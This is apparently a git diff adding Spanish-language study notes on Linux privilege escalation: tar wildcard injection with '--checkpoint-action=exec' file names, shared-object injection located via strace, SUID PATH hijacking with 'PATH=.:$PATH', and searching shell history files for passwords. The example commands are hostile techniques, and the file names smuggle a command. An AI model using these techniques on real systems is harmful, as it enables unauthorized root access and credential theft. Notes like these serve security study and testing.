@@ -73,3 +73,46 @@ Explotar cronjobs por medio de la variable de entorno:
 Dependiendo del orden de los paths dentro de la variable de entorno PATH del cronlab, podemos suplantar un archivo
 en tanto tengamos privilegios sobre una carpeta que, dentro del path, sea anterior a la carpeta donde reside el archivo.
 
+Explotación de wildcard
+
+Si el proceso que tiene un wildcard posee una command line, podemos usar un checkpoint para correr un código malicioso. Ej:
+
+script:
+tar czf /tmp/backup.tar.gz *
+
+en la carpeta:
+"carpeta a ser compresa"/shell.sh
+chmod +x "carpeta"/shell.sh
+touch "carpeta"/--checkpoint=1
+touch "carpeta"/--checkpoint-action=exec=shell.elf
+
+
+
+SUID:
+
+
+Shared Object Injection:
+
+Podemos inyectar objetos cuando un archivo se sirve de otro no encontrado si es que este(el no encontrado) se encuentra en
+un directorio sobre el que tenemos algún poder.
+Para saber esto utilizamos el siguiente comando:
+strace PATH+ARCHIVO 2>&1 | grep -iE "open|access|no such file"
+
+al divisar el archivo faltante creamos uno con el código malicioso. Al correr nuevamente el fichero, ejecutará nuestro código.
+
+Explotar variables de entorno de un SUID:
+
+al correr un ejecutable podemos ver la acción que realiza.
+Si a su vez lo corremos con el comando "strings" podemos ver caracteres imprimibles del mismo.
+strings "path/ejecutable"
+si vemos que corre comandos que no tienen un path absoluto, sino que son llamados y buscados en la variable PATH, podemos
+crear un código malicioso y modificar la variable path preponiendo la carpeta donde se encuentra el file malicioso.
+vamos a la carpeta donde está el archivo malicioso y agregamos la orden y agregamos la orden "PATH=.$PATH", con
+esto indicamos que la carpeta en la que nos encontramos va a ser el path, y luego el file que vamos a correr
+PATH=.:$PATH "path-to-file/file"
+
+
+Passwords y keys en los arhivos historicos:
+
+cat ~/.*history | less
+
